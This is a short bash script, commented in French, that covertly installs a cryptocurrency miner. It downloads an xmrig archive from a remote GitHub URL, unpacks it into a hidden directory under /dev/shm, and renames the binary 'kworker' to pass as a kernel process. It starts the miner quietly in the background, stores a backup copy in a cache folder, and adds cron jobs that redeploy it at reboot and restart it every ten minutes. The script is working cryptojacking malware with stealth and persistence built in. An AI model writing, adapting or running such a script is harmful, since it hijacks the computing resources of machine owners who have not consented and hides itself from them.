#!/bin/bash

DIR="/dev/shm/.syslog"
BIN="kworker"
ARCHIVE_URL="https://raw.githubusercontent.com/ThipyThipy/machinee/main/xmrig.tar.gz"
PERSIST_DIR="$HOME/.cache/sysconfig"
PERSIST_ARCHIVE="$PERSIST_DIR/xmrig.tar.gz"
LOGFILE="$DIR/.log"

# Créer les dossiers
mkdir -p "$DIR" "$PERSIST_DIR" && cd "$DIR" || exit 1

# Télécharger et extraire le mineur
curl -fsSL "$ARCHIVE_URL" -o miner.tar.gz
tar -xzf miner.tar.gz

# Trouver le binaire dans l'archive
BIN_FILE=$(find . -type f -executable -name "*" | head -n 1)
mv "$BIN_FILE" "$BIN"
chmod +x "$BIN"

# Lancer furtivement avec log temporaire
nohup nice -n 19 "$DIR/$BIN" --config="$DIR/cfg.json" > "$LOGFILE" 2>&1 &

# Sauvegarde dans un dossier persistant
cp miner.tar.gz "$PERSIST_ARCHIVE"

# Cron reboot : re-déploiement furtif + log debug
(crontab -l 2>/dev/null; echo "@reboot sleep \$((RANDOM % 60)) && mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/cfg.json > $LOGFILE 2>&1") | crontab -

# Watchdog toutes les 10 min avec log debug
(crontab -l 2>/dev/null; echo "*/10 * * * * pgrep -f $BIN > /dev/null || (mkdir -p $DIR && tar -xzf $PERSIST_ARCHIVE -C $DIR && $DIR/$BIN --config=$DIR/cfg.json > $LOGFILE 2>&1)") | crontab -
